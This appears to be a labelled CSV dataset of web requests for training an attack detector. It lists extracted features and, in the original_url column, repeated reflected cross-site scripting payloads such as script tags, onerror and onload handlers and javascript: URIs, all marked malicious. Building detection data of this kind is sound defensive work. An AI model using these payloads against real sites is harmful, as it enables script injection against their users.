src_port,dest_port,http_method,http_status,http_resp_len,http_url_len,url_contains_script_tag,url_contains_onerror,url_contains_onload,url_contains_onclick,url_contains_onmouseover,url_contains_onfocus,url_contains_alert,url_contains_javascript,url_contains_eval,url_contains_document,url_contains_cookie,url_contains_iframe,url_contains_svg,url_contains_img,url_contains_object,url_contains_embed,http_method_GET,http_method_POST,http_method_PUT,http_method_DELETE,url_has_query_params,url_query_param_count,url_encoded_chars,url_suspicious_chars,response_2xx,response_3xx,response_4xx,response_5xx,is_malicious,attack_type,timestamp,original_url
51794,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:20.318302+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
49324,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:22.332095+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
49326,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:24.345206+0000,/?q=<object%20data='javascript:alert(1)'>
49328,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:26.360233+0000,/?q=<embed%20src='javascript:alert(1)'>
49336,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:28.373593+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
49352,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:40:30.388933+0000,/?q=<script>alert(1)</script>
44812,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:32.429732+0000,/?q=<img%20src=x%20onerror=alert(1)>
44828,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:34.447855+0000,/?q=<svg%20onload=alert(1)>
44842,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:36.461805+0000,/?q=<iframe%20src='javascript:alert(1)'>
44848,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:38.475424+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
44854,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:40.488691+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
59232,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:42.502189+0000,/?q=<body%20onload=alert(1)>
59246,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:44.515335+0000,/?q=<details%20open%20ontoggle=alert(1)>
59252,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:46.528184+0000,"/?q=""><svg%20onload=alert(1)>"
59266,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:40:48.541491+0000,/?q=</textarea><script>alert(1)</script>
59276,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:50.554520+0000,/?q=<img%20src=1%20onerror=prompt(1)>
39994,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:40:52.568227+0000,/?q=<marquee%20onstart=confirm(1)>
40008,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:40:54.581385+0000,/?q=<script>/*</script><script>alert(1)</script>
40020,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:40:56.594245+0000,/?q=<script>''-alert(1)//</script>
40032,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:40:58.607109+0000,/?q=<svg><script>alert(1)</script></svg>
40046,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:00.619402+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
50294,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:02.633789+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
50302,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:04.647637+0000,/?q=<object%20data='javascript:alert(1)'>
50308,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:06.661827+0000,/?q=<embed%20src='javascript:alert(1)'>
50312,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:08.675573+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
50316,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:41:10.690130+0000,/?q=<script>alert(1)</script>
43746,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:12.705403+0000,/?q=<img%20src=x%20onerror=alert(1)>
43754,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:14.720081+0000,/?q=<svg%20onload=alert(1)>
43758,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:16.733065+0000,/?q=<iframe%20src='javascript:alert(1)'>
43762,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:18.746022+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
43778,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:20.758854+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
56022,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:22.772514+0000,/?q=<body%20onload=alert(1)>
56036,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:24.785651+0000,/?q=<details%20open%20ontoggle=alert(1)>
56044,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:26.798516+0000,"/?q=""><svg%20onload=alert(1)>"
56060,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:41:28.810821+0000,/?q=</textarea><script>alert(1)</script>
56068,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:30.824000+0000,/?q=<img%20src=1%20onerror=prompt(1)>
35036,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:32.839252+0000,/?q=<marquee%20onstart=confirm(1)>
35038,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:41:34.853510+0000,/?q=<script>/*</script><script>alert(1)</script>
35050,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:41:36.866200+0000,/?q=<script>''-alert(1)//</script>
35052,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:41:38.880654+0000,/?q=<svg><script>alert(1)</script></svg>
35058,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:40.894314+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
34358,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:42.908081+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
34372,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:44.921147+0000,/?q=<object%20data='javascript:alert(1)'>
34384,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:46.933813+0000,/?q=<embed%20src='javascript:alert(1)'>
34400,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:48.946833+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
39420,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:41:50.962238+0000,/?q=<script>alert(1)</script>
39428,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:52.976906+0000,/?q=<img%20src=x%20onerror=alert(1)>
39438,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:54.990649+0000,/?q=<svg%20onload=alert(1)>
39450,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:57.003770+0000,/?q=<iframe%20src='javascript:alert(1)'>
39462,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:41:59.017090+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
35882,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:01.030821+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
35886,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:03.044729+0000,/?q=<body%20onload=alert(1)>
35888,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:05.058536+0000,/?q=<details%20open%20ontoggle=alert(1)>
35892,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:07.072186+0000,"/?q=""><svg%20onload=alert(1)>"
35908,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:42:09.086015+0000,/?q=</textarea><script>alert(1)</script>
51984,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:11.101083+0000,/?q=<img%20src=1%20onerror=prompt(1)>
52000,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:13.115169+0000,/?q=<marquee%20onstart=confirm(1)>
52016,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:42:15.129496+0000,/?q=<script>/*</script><script>alert(1)</script>
52028,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:42:17.145066+0000,/?q=<script>''-alert(1)//</script>
52036,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:42:19.161191+0000,/?q=<svg><script>alert(1)</script></svg>
36144,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:21.175942+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
36156,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:23.190706+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
36172,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:25.206055+0000,/?q=<object%20data='javascript:alert(1)'>
36178,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:27.220853+0000,/?q=<embed%20src='javascript:alert(1)'>
36180,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:29.235438+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
45966,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:42:31.251742+0000,/?q=<script>alert(1)</script>
45970,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:33.265228+0000,/?q=<img%20src=x%20onerror=alert(1)>
45974,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:35.280329+0000,/?q=<svg%20onload=alert(1)>
45978,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:37.295137+0000,/?q=<iframe%20src='javascript:alert(1)'>
45992,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:39.309561+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
39924,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:41.323549+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
39934,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:43.337046+0000,/?q=<body%20onload=alert(1)>
39940,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:45.350160+0000,/?q=<details%20open%20ontoggle=alert(1)>
39952,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:47.363340+0000,"/?q=""><svg%20onload=alert(1)>"
39958,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:42:49.376628+0000,/?q=</textarea><script>alert(1)</script>
33908,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:51.389766+0000,/?q=<img%20src=1%20onerror=prompt(1)>
33920,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:42:53.403754+0000,/?q=<marquee%20onstart=confirm(1)>
33922,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:42:55.416716+0000,/?q=<script>/*</script><script>alert(1)</script>
33924,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:42:57.430342+0000,/?q=<script>''-alert(1)//</script>
33936,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:42:59.443687+0000,/?q=<svg><script>alert(1)</script></svg>
59662,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:01.460795+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
59670,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:03.476448+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
59678,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:05.489808+0000,/?q=<object%20data='javascript:alert(1)'>
59684,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:07.504069+0000,/?q=<embed%20src='javascript:alert(1)'>
59686,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:09.518262+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
43956,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:43:11.533692+0000,/?q=<script>alert(1)</script>
43960,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:13.548295+0000,/?q=<img%20src=x%20onerror=alert(1)>
43972,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:15.564373+0000,/?q=<svg%20onload=alert(1)>
43976,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:17.579579+0000,/?q=<iframe%20src='javascript:alert(1)'>
43986,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:19.594977+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
54320,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:21.611713+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
54336,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:23.626381+0000,/?q=<body%20onload=alert(1)>
54350,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:25.640280+0000,/?q=<details%20open%20ontoggle=alert(1)>
54362,3000,GET,200,3748,27,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:27.655506+0000,"/?q=""><svg%20onload=alert(1)>"
54372,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:43:29.668691+0000,/?q=</textarea><script>alert(1)</script>
50386,3000,GET,200,3748,33,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:31.681300+0000,/?q=<img%20src=1%20onerror=prompt(1)>
50402,3000,GET,200,3748,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:33.695822+0000,/?q=<marquee%20onstart=confirm(1)>
50410,3000,GET,200,3748,48,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:43:35.708952+0000,/?q=<script>/*</script><script>alert(1)</script>
50412,3000,GET,200,3748,34,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:43:37.722812+0000,/?q=<script>''-alert(1)//</script>
50424,3000,GET,200,3748,40,1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:43:39.736555+0000,/?q=<svg><script>alert(1)</script></svg>
55428,3000,GET,200,3748,79,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:41.751746+0000,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>
55444,3000,GET,200,3748,44,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:43.765586+0000,/?q=<video%20src='invalid'%20onerror='alert(1)'>
55448,3000,GET,200,3748,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:45.779487+0000,/?q=<object%20data='javascript:alert(1)'>
55456,3000,GET,200,3748,37,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:47.793193+0000,/?q=<embed%20src='javascript:alert(1)'>
55468,3000,GET,200,3748,67,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:49.806729+0000,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>
37580,3000,GET,200,3748,29,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,1,1,0,0,0,1,xss,2025-07-29T16:43:51.821835+0000,/?q=<script>alert(1)</script>
37592,3000,GET,200,3748,32,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:53.835624+0000,/?q=<img%20src=x%20onerror=alert(1)>
37604,3000,GET,200,3748,25,0,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:55.849401+0000,/?q=<svg%20onload=alert(1)>
37618,3000,GET,200,3748,38,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:57.863418+0000,/?q=<iframe%20src='javascript:alert(1)'>
37632,3000,GET,200,3748,43,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:43:59.876924+0000,/?q=<a%20href='javascript:alert(1)'>Click</a>
57282,3000,GET,200,3748,38,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:01.891436+0000,/?q=<input%20autofocus%20onfocus=alert(1)>
57298,3000,GET,200,3748,26,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:03.906016+0000,/?q=<body%20onload=alert(1)>
57304,3000,GET,200,3748,36,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,1,0,0,0,1,xss,2025-07-29T16:44:05.921095+0000,/?q=<details%20open%20ontoggle=alert(1)>
